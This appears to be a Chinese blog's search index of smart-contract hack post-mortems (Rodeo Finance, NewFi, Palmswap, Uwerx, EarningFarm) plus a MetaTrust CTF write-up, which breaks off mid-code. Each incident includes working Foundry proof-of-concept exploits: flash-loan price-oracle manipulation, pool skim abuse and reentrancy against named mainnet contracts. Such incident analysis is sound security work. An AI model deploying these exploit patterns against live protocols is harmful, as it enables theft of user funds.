<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ERC721A解析</title>
      <link href="/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/"/>
      <url>/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230711 RodeoFinance</title>
      <link href="/2023/11/03/20230711-RodeoFinance/"/>
      <url>/2023/11/03/20230711-RodeoFinance/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p><pre><code>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)  external  loop  returns (uint256){  if (status &lt; S_LIVE) revert WrongStatus();  if (!pools[pol]) revert InvalidPool();  if (strategies[str] == address(0)) revert InvalidStrategy();  uint256 id = nextPosition++;  Position storage p = positions[id];  p.owner = usr;  p.pool = pol;  p.strategy = str;  p.outset = block.timestamp;  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));  (int256 bas, int256 sha, int256 bar) = actor.edit(id, int256(amt), int256(bor), dat);  p.amount = uint256(bas);  p.shares = uint256(sha);  p.borrow = uint256(bar);  emit Edit(id, int256(amt), int256(bor), sha, bar);  return id;}</code></pre><p>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p><pre><code>function latestAnswer() external view returns (int256) {  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), "stale price");  int256 price = (prices[0] + prices[1] + prices[2] + prices[3]) / 4;  return price;}</code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da// Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25ainterface IInvestor {    function earn(        address usr,        address pol,        uint256 str,        uint256 amt,        uint256 bor,        bytes memory dat    ) external returns (uint256);}interface ICamelotRouter {    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] memory path,        address to,        address referrer,        uint256 deadline    ) external;}interface ISwapRouter {    struct ExactInputParams {        bytes path;        address recipient;        uint256 deadline;        uint256 amountIn;        uint256 amountOutMinimum;    }    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);}contract RodeoTest is Test {    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);    function setUp() public {        cheats.createSelectFork("arbitrum", 110_043_452);        cheats.label(address(unshETH), "unsETH");        cheats.label(address(WETH), "WETH");        cheats.label(address(USDC), "USDC");        cheats.label(address(Investor), "Investor");        cheats.label(address(Router), "Router");        cheats.label(address(SwapRouter), "SwapRouter");        cheats.label(address(Vault), "Vault");    }    function testExploit() public {        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);        unshETH.approve(address(Router), type(uint256).max);        WETH.approve(address(Router), type(uint256).max);        USDC.approve(address(SwapRouter), type(uint256).max);        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));               swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));        swapUSDCToWETH();        takeWETHFlashloanOnBalancer();    }    function receiveFlashLoan(        address[] memory tokens,        uint256[] memory amounts,        uint256[] memory feeAmounts,        bytes memory userData    ) external {                swapTokens(amounts[0], address(WETH), address(USDC));                swapUSDCToWETH();                WETH.transfer(address(Vault), amounts[0]);    }    function swapTokens(uint256 amountIn, address fromToken, address toToken) internal {        address[] memory path = new address[](2);        path[0] = fromToken;        path[1] = toToken;        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(            amountIn, 0, path, address(this), address(0), block.timestamp + 100        );    }    function swapUSDCToWETH() internal {        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));        ISwapRouter.ExactInputParams memory params =            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);        SwapRouter.exactInput(params);    }    function takeWETHFlashloanOnBalancer() internal {        address[] memory tokens = new address[](1);        tokens[0] = address(WETH);        uint256[] memory amounts = new uint256[](1);        amounts[0] = 30e18;        Vault.flashLoan(address(this), tokens, amounts, bytes(""));    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230717 NewFi</title>
      <link href="/2023/10/26/20230717-NewFi/"/>
      <url>/2023/10/26/20230717-NewFi/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月17日，bscscan链上的NewFi被黑客攻击，一共损失了价值31k$的BUSD。</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们使用<a href="https://explorer.phalcon.xyz/tx/bsc/0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5">phalcon</a>进行分析，通过phalcon的调用栈分析，可以看到攻击者首先从4个池子贷了大量的BUSD，然后在PancakeSwap: Smart Router V3中通过以质押与回收BUSD从中套了31,099的BUSD。分析StakedV3.Invest()的调用栈，发现sqrtPriceX96从456917351256涨到了396517633895，显然攻击者通过StakedV3的Invest()方法操纵了价格。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : 0xb8dc09eec82cab2e86c7edc8dd5882dd92d22411// Attack Tx : 0x557628123d137ea49564e4dccff5f5d1e508607e96dd20fe99a670519b679cb5interface IStakedV3 {    function Invest(        uint256 id,        uint256 amount,        uint256 quoteAmount,        uint256 investType,        uint256 cycle,        uint256 deadline    ) external payable;}contract ContractTest is Test {    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);    Uni_Router_V3 Router = Uni_Router_V3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);    Uni_Pair_V3 Pair1 = Uni_Pair_V3(0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6);    Uni_Pair_V3 Pair2 = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);    Uni_Pair_V3 Pair3 = Uni_Pair_V3(0x369482C78baD380a036cAB827fE677C1903d1523);    IStakedV3 StakedV3 = IStakedV3(0xB8dC09Eec82CaB2E86C7EdC8DD5882dd92d22411);    function setUp() public {        vm.createSelectFork("bsc", 30_043_573);        vm.label(address(BUSD), "BUSD");        vm.label(address(USDT), "USDT");        vm.label(address(Router), "Router");        vm.label(address(Pair1), "Pair1");        vm.label(address(Pair2), "Pair2");        vm.label(address(StakedV3), "StakedV3");    }    function testExploit() public {        USDT.approve(address(Router), type(uint256).max);        BUSD.approve(address(Router), type(uint256).max);        BUSD.approve(address(StakedV3), type(uint256).max);        BUSD.approve(address(StakedV3), type(uint256).max);        Pair1.flash(address(this), 0, BUSD.balanceOf(address(Pair1)), abi.encode(BUSD.balanceOf(address(Pair1))));        emit log_named_decimal_uint(            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()            );    }    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {        if (msg.sender == address(Pair1)) {            Pair2.flash(address(this), 0, BUSD.balanceOf(address(Pair2)), abi.encode(BUSD.balanceOf(address(Pair2))));            uint256 repayAmount = abi.decode(data, (uint256));            BUSD.transfer(address(Pair1), repayAmount + amount1);        } else if (msg.sender == address(Pair2)) {            Pair3.flash(address(this), 0, BUSD.balanceOf(address(Pair3)), abi.encode(BUSD.balanceOf(address(Pair3))));            uint256 repayAmount = abi.decode(data, (uint256));            BUSD.transfer(address(Pair2), repayAmount + amount1);        } else if (msg.sender == address(Pair3)) {            BUSDToUSDT();            StakedV3.Invest(2, 1 ether, 2, 1, 7, block.timestamp + 1000); // remove liquidity and swap BUSD to USDT            USDTToBUSD();            uint256 repayAmount = abi.decode(data, (uint256));            BUSD.transfer(address(Pair3), repayAmount + amount1);        }    }    function BUSDToUSDT() internal {        bytes memory path = abi.encodePacked(address(BUSD), uint24(100), address(USDT));        address recipient = address(this);        uint256 amountIn = 12_000_000 ether;        uint256 amountOutMinimum = 0;        Uni_Router_V3.ExactInputParams memory ExactInputParams =            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);        Router.exactInput(ExactInputParams);    }    function USDTToBUSD() internal {        bytes memory path = abi.encodePacked(address(USDT), uint24(100), address(BUSD));        address recipient = address(this);        uint256 amountIn = USDT.balanceOf(address(this));        uint256 amountOutMinimum = 0;        Uni_Router_V3.ExactInputParams memory ExactInputParams =            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);        Router.exactInput(ExactInputParams);    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230724 Palmswap</title>
      <link href="/2023/10/13/20230724-Palmswap/"/>
      <url>/2023/10/13/20230724-Palmswap/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>Palmswap由于其蹩脚的业务逻辑，导致了价格被黑客操控，导致被黑客盗取了大约$900K</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/bsc/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9">phalcon</a>来分析。</p><p>通过调用栈发现，攻击者先贷了3,000,000的USDT，然后质押1,000,000的USDT来获得大约996,324的PLP，然后用剩下的2,000,000的USDT，去购买了USDP，然后攻击者销毁了持有的所有的PLP，但得到了大约1,947,570的USTD。最后卖出USDP,大约得到1,947,570的USDT。</p><p>显然，攻击者在通过购买USDP操纵了PLP的价格。</p><pre><code> function getPrice(bool _maximise) external view returns (uint256) {        uint256 aum = getAum(_maximise);        uint256 supply = IERC20Upgradeable(plp).totalSupply();        return (aum * PLP_PRECISION) / supply;    }    function getAums() public view returns (uint256[] memory) {        uint256[] memory amounts = new uint256[](2);        amounts[0] = getAum(true);        amounts[1] = getAum(false);        return amounts;    }    function getAumInUsdp(bool maximise)        public        view        override        returns (uint256)    {        uint256 aum = getAum(maximise);        return (aum * (10**USDP_DECIMALS)) / PRICE_PRECISION;    }    function getAum(bool maximise) public view returns (uint256) {        uint256 length = vault.allWhitelistedTokensLength();        uint256 aum = aumAddition;        IVault _vault = vault;        uint256 collateralTokenPrice = maximise            ? _vault.getMaxPrice(collateralToken)            : _vault.getMinPrice(collateralToken);        uint256 collateralDecimals = _vault.tokenDecimals(collateralToken);        uint256 currentAmmDeduction = (vault.permanentPoolAmount() *            collateralTokenPrice) / (10**collateralDecimals);        aum +=            (vault.poolAmount() * collateralTokenPrice) /            (10**collateralDecimals);        .......</code></pre><p>很明显攻击者通过买USDP来使Price增大。然后通过移除流动性获利。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>pragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : https://bscscan.com/address/0xd990094a611c3de34664dd3664ebf979a1230fc1// Attack Tx : https://bscscan.com/tx/0x62dba55054fa628845fecded658ff5b1ec1c5823f1a5e0118601aa455a30eac9interface IVault {    function buyUSDP(address _receiver) external returns (uint256);    function sellUSDP(address _receiver) external returns (uint256);}interface ILiquidityEvent {    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);    function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);}contract PalmswapTest is Test {    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);    IERC20 PLP = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);    IERC20 USDP = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);    IVault Vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);    ILiquidityEvent LiquidityEvent = ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);    IAaveFlashloan RadiantLP = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);    address private constant plpManager = 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;    address private constant fPLP = 0x305496cecCe61491794a4c36D322b42Bb81da9c4;    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);    function setUp() public {        cheats.createSelectFork("bsc", 30_248_637);        cheats.label(address(BUSDT), "BUSDT");        cheats.label(address(PLP), "PLP");        cheats.label(address(USDP), "USDP");        cheats.label(address(Vault), "Vault");        cheats.label(address(LiquidityEvent), "LiquidityEvent");        cheats.label(address(RadiantLP), "RadiantLP");        cheats.label(plpManager, "plpManager");        cheats.label(fPLP, "fPLP");    }      function testExploit() public {        deal(address(BUSDT), address(this), 0);        BUSDT.approve(plpManager, type(uint256).max);        BUSDT.approve(address(RadiantLP), type(uint256).max);        PLP.approve(fPLP, type(uint256).max);        takeFlashLoanOnRadiant();    }    function executeOperation(        address[] calldata assets,        uint256[] calldata amounts,        uint256[] calldata premiums,        address initiator,        bytes calldata params    ) external returns (bool) {               uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);        BUSDT.transfer(address(Vault), 2_000_000 * 1e18);        Vault.buyUSDP(address(this));                uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);        Vault.sellUSDP(address(this));        return true;    }    function takeFlashLoanOnRadiant() internal {        address[] memory assets = new address[](1);        assets[0] = address(BUSDT);        uint256[] memory amounts = new uint256[](1);        amounts[0] = 3_000_000 * 1e18;        uint256[] memory modes = new uint256[](1);        modes[0] = 0;        RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20230802 Uwerx</title>
      <link href="/2023/10/12/20230802-Uwerx/"/>
      <url>/2023/10/12/20230802-Uwerx/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年8月2日，<a href="https://twitter.com/uwerx_network">Uwerx</a>被黑客攻击，损失了175ETH。</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8">phalcon</a>来分析。</p><p>通过调用栈能发现攻击者通过不断在uniswap V2 Pool交换，最终获利。很明显是Pool的兑换比率被破坏了。之所以能被破坏，是因为uwerx TOKEN合约的_transfer()方法被利用了。</p><pre><code>function _transfer(        address from,        address to,        uint256 amount    ) internal virtual {        require(from != address(0), "ERC20: transfer from the zero address");        require(to != address(0), "ERC20: transfer to the zero address");        _beforeTokenTransfer(from, to, amount);        uint256 fromBalance = _balances[from];        require(fromBalance &gt;= amount, "ERC20: transfer amount exceeds balance");        unchecked {            _balances[from] = fromBalance - amount;            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by            // decrementing then incrementing.            _balances[to] += amount;        }        if (to == uniswapPoolAddress) {            uint256 userTransferAmount = (amount * 97) / 100;            uint256 marketingAmount = (amount * 2) / 100;            uint256 burnAmount = amount - userTransferAmount - marketingAmount;            emit Transfer(from, to, userTransferAmount);            emit Transfer(from, marketingWalletAddress, marketingAmount);            _burn(from, burnAmount);        } else {            emit Transfer(from, to, amount);        }                _afterTokenTransfer(from, to, amount);    }</code></pre><p>可以发现当to == uniswapPoolAddress时会有1%的token被销毁。uniswapPoolAddress为0x00……0001，此时调用uniswap的skim(to)方法，to设为0x00……0001，就能让Pool的兑换比率被破坏。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>pragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : https://etherscan.io/token/0x4306b12f8e824ce1fa9604bbd88f2ad4f0fe3c54// Attack Tx : https://etherscan.io/tx/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8contract ContractTest is Test {    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);    IERC20 WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);    Uni_Pair_V2 pair = Uni_Pair_V2(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);        function setUp() public {        vm.createSelectFork("https://eth.llamarpc.com", 17826202);        vm.label(address(WETH), "WETH");        vm.label(address(WERX), "WERX");        vm.label(address(Router), "Router");        vm.label(address(pair), "pair");    }    function testExploit() external {        // mock a flash loan for simplicity        deal(address(WETH), address(this), 20_000 ether);        WETH.approve(address(Router), type(uint256).max);        WERX.approve(address(Router), type(uint256).max);                pair.sync();        address[] memory path = new address[](2);        path[0] = address(WETH);        path[1] = address(WERX);        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(20_000 ether, 0, path, address(this), block.timestamp);                WERX.transfer(address(pair), 4429817738575912760684500);                                             pair.skim(address(0x01));        pair.sync();        path[0] = address(WERX);        path[1] = address(WETH);        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WERX.balanceOf(address(this)), 0, path, address(this), block.timestamp);        emit log_named_decimal_uint(            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()        );        emit log_named_decimal_uint(            "Attacker WETH balance after exploit, ETH PROFIT", WETH.balanceOf(address(this)) - 20_000 ether, WETH.decimals()        );    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EarningFram</title>
      <link href="/2023/10/03/20230809-EarningFram/"/>
      <url>/2023/10/03/20230809-EarningFram/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>EarningFram被攻击，损失$286K。（EarningFarm项目通过吸收用户资金去投资Aave，得到收益，用户在存入ETH，得到share）</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过<a href="https://explorer.phalcon.xyz/tx/eth/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa?line=686">phalcon</a>来分析。</p><p>我们能发现在withdraw中，当触发攻击合约的fallback()方法时，在fallback中将share转给另一个被攻击者控制的地址。(又没用检查-影响-交互模式！！！)</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>pragma solidity ^0.8.10;import "forge-std/Test.sol";import "./interface.sol";// Vulnerable Contract : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e// Attack Tx : 0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fainterface IENF_ETHLEV is IERC20 {    function deposit(uint256 assets, address receiver) external payable returns (uint256);    function withdraw(uint256 assets, address receiver) external returns (uint256);    function convertToAssets(uint256 shares) external view returns (uint256);    function totalAssets() external view returns (uint256);}contract ContractTest is Test {    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;    Exploiter exploiter;    uint256 nonce;    function setUp() public {        vm.createSelectFork("mainnet", 17_875_885);        vm.label(address(WETH), "WETH");        vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");        vm.label(address(Pair), "Piar");        exploiter = new Exploiter();    }    function testExploit() external {        while (ENF_ETHLEV.totalAssets() &gt; 1 ether) {            deal(address(this), 0);            Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));            emit log_named_decimal_uint(                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()                );        }    }    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {        WETH.withdraw(WETH.balanceOf(address(this)));        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);        uint256 assets = ENF_ETHLEV.totalAssets();        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));        ENF_ETHLEV.withdraw(assetsAmount, address(this)); // withdraw all assets, burn small shares by reentracny, re-enter point        exploiter.withdraw(); // withdraw all assets        WETH.deposit{value: address(this).balance}();        uint256 amount = abi.decode(data, (uint256));        WETH.transfer(address(Pair), amount1 + amount);    }    receive() external payable {        if (msg.sender == Controller) {            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);            nonce++;        }    }}contract Exploiter {    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);    function withdraw() external {        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));        ENF_ETHLEV.withdraw(assetsAmount, address(this));        payable(msg.sender).transfer(address(this).balance);    }    receive() external payable {}}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MetaTrust</title>
      <link href="/2023/10/03/MetaTrust/"/>
      <url>/2023/10/03/MetaTrust/</url>
      
        <content type="html"><![CDATA[<p>最近参加了MetaTrust CTF，于是就有这篇博客。（注：本篇题目并不全，只有一些我认为有意思的）</p><h1 id="Achilles"><a href="#Achilles" class="headerlink" title="Achilles"></a>Achilles</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>要我们获取至少100ether的weth。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有两个ERC20token,一个是标准的WTETH，一个是Achilles，在Achilles中一个 _airdrop()方法去空投，空投目标的地址是用异或，显然我们可以控制。空投的数量airdropAmount可以由Airdrop()方法设置，但是需要使得池子里的WETH数量是Achilles的5倍以上，这我们能通过闪贷实现。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;import {Test} from "forge-std/Test.sol";import {SetUp} from "../src/Achilles/SetUp.sol";import {Achilles} from "../src/Achilles/Achilles.sol";import {PancakePair, IPancakeCallee} from "../src/Achilles/PancakeSwap.sol";import {WETH} from "../src/Achilles/WETH.sol";contract AchillesTest is Test {    SetUp public _setUp;    Solver public solver;    function setUp() external {        _setUp = new SetUp();        solver = new Solver();        vm.roll(18189701);     }    function test_hackAchilles() public {        solver.solve(_setUp);        assertTrue(_setUp.isSolved());    }}contract Solver is IPancakeCallee {    bytes1 private constant START = hex"ME";    uint256 private START_PAIR_BALANCE = 1000 ether;    Achilles private achilles;    PancakePair private pair;    function solve(SetUp setUp) external {        achilles = setUp.achilles();        pair = setUp.pair();        pair.swap(START_PAIR_BALANCE - 1, 0, address(this), hex"aa");        getAirdropToken(address(pair));        pair.sync();        pair.swap(0, 100 ether, address(this), hex"ff");         setUp.weth().transfer(msg.sender, 100 ether);         selfdestruct(payable(msg.sender));    }    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {        if (msg.sender != address(pair)) {            revert("FAIL");        }        uint256 airdropAmount = 1;        if (START == data[0]) {            achilles.Airdrop(airdropAmount);             achilles.transfer(msg.sender, amount0);             getAirdropToken(address(this));         } else {            achilles.transfer(msg.sender, airdropAmount);        }    }    function getAirdropToken(address to) private {        address vanishingAddress;        assembly {            vanishingAddress := or(address(), number())         }        achilles.transferFrom(vanishingAddress, to, 0);    }}</code></pre><h1 id="Foo"><a href="#Foo" class="headerlink" title="Foo"></a>Foo</h1><h2 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h2><p>本题要求我们能通过4个stage和一个set up的检测。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>先看set up</p><pre><code> require(uint256(uint160(msg.sender)) % 1000 == 137, "!good caller");</code></pre><p>用CREATE2爆破即可。</p><p>然后是stage1</p><pre><code>    (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("check()"));    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked("1337")), "stage1: !check");    (, data) = msg.sender.staticcall(abi.encodeWithSignature("check()"));    require(abi.decode(data, (bytes32)) == keccak256(abi.encodePacked("13337")), "stage1: !check2");</code></pre><p>需要俩次返回值不同。因为是staticcall，所以无法使用变量来判断，那我们可以用gas剩余量来判断，即：第一次访问是热地址，返回”1337”，第二次访问是冷地址，消耗100gas，返回“13337”。</p><p>然后是stage2</p><pre><code>require(this._stage2() == 7, "!stage2");</code></pre><p>要求_stage2恰好返回7，显然可以通过给调用增加gas限制来实现。</p><p>然后是stage3</p><pre><code> for(uint i=0 ; i&lt;8 ; i++) {            require(challenge[i] == answer[i], "stage3: !sort");        }</code></pre><p>要求猜数，题中使用block.timestamp来构造随机数，但在在同一笔交易中我们也能得到。</p><p>最后是stage4</p><pre><code>function stage4() external {        require(stats[3][msg.sender], "goto stage3");        (, bytes memory data) = msg.sender.staticcall(abi.encodeWithSignature("pos()"));        bytes32 pos = abi.decode(data, (bytes32));        assembly {            sstore(pos, 0x1)        }    }    function isSolved() external view returns (bool) {        return stats[4][who];    }</code></pre><p>要求我们找到stats[4][5]的位置，并改为true。这个简单，写个脚本算一下即可。</p><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><pre><code>pragma solidity ^0.8.0;import {Test} from "forge-std/Test.sol";import {Foo} from "../src/Foo.sol";contract FooTest is Test {    Foo public foo;    function setUp() external {        foo = new Foo();    }    function test_hackFoo() public {        uint256 salt = findSalt();         Solver solver = new Solver{salt: bytes32(salt)}();        solver.solve(foo);        assertTrue(foo.isSolved());    }    function findSalt() private view returns (uint256 correctSalt) {        bytes32 creationCodeHash = keccak256(type(Solver).creationCode);        for (uint256 salt;; salt++) {            bytes32 result = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, creationCodeHash));            if (uint160(uint256(result)) % 1000 == 137) {                return salt;            }        }    }}contract Solver {    uint256 private sortedTimestamp;     function solve(Foo foo) external {        foo.setup();        bool isSolved;        while (!isSolved) {            try foo.stage1() {                isSolved = true;            } catch {}        }        isSolved = false;        for (uint256 gas = 40_000; !isSolved; gas += 500) {            try foo.stage2{gas: gas}() {                isSolved = true;            } catch {                if (gas &gt; 50_000) revert();            }        }        setSortedStorageArr();        foo.stage3();        foo.stage4();    }    function check() external view returns (bytes32 answer) {        if (gasleft() &amp; 1 == 0) {            return keccak256(abi.encodePacked("1337"));        } else {            return keccak256(abi.encodePacked("13337"));        }    }    function sort(uint256[] calldata ) external view returns (uint256[] memory) {        uint256[] memory sortedTimestampArr = new uint[](8);        uint256 cachedSortedTimestamp = sortedTimestamp;        for (uint256 i; i &lt; sortedTimestampArr.length; i++) {            sortedTimestampArr[i] = uint32(cachedSortedTimestamp &gt;&gt; 32 * i);        }        return sortedTimestampArr;    }    function pos() external view returns (bytes32 slot) {        uint256 keyValue = 4;        uint256 mappingSlot = 1;        bytes32 intermediateSlot = calcMappingSlot(keyValue, mappingSlot);        return calcMappingSlot(uint160(address(this)), uint256(intermediateSlot));    }    function calcMappingSlot(uint256 key, uint256 mappingSlot) private pure returns (bytes32 slot) {        return keccak256(abi.encodePacked(key, mappingSlot));    }    function setSortedStorageArr() private {        uint256[] memory timestampElements = new uint[](8);        timestampElements[0] = (block.timestamp &amp; 